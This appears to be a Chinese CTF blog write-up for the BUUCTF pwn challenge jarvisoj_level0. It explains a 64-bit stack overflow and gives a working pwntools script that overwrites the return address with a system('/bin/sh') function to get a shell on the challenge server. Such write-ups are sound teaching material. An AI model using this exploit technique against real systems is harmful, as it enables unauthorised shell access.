---
title: "BUUCTF Pwn Jarvisoj_level0"
date: 2020-03-05T18:55:06+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# jarvisoj_level0

非常简单的栈溢出

![image-20200305190052524](/images/image-20200305190052524.png)

![image-20200305190125632](/images/image-20200305190125632.png)

![image-20200305190139582](/images/image-20200305190139582.png)

![image-20200305190216565](/images/image-20200305190216565.png)

0x80的栈可写0x200，并且有system("/bin/sh\")，地址为0x400596

![image-20200305190844043](/images/image-20200305190844043.png)

![image-20200305190430775](/images/image-20200305190430775.png)

stack offset = 0x80 + 0x8 =136，+8是因为存在leave语句所以要多加0x8(64位)才能覆盖到返回地址

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-
from pwn import * 
#context.log_level = 'debug'
#sh = process('./level0')
sh = remote('node3.buuoj.cn',26813)

offset = 0x80
system_addr = 0x400596

payload = 'a'*offset + 'a'*8 +p64(system_addr)
sh.sendlineafter('Hello, World\n',payload)
sh.interactive()
```

![image-20200305190630224](/images/image-20200305190630224.png)

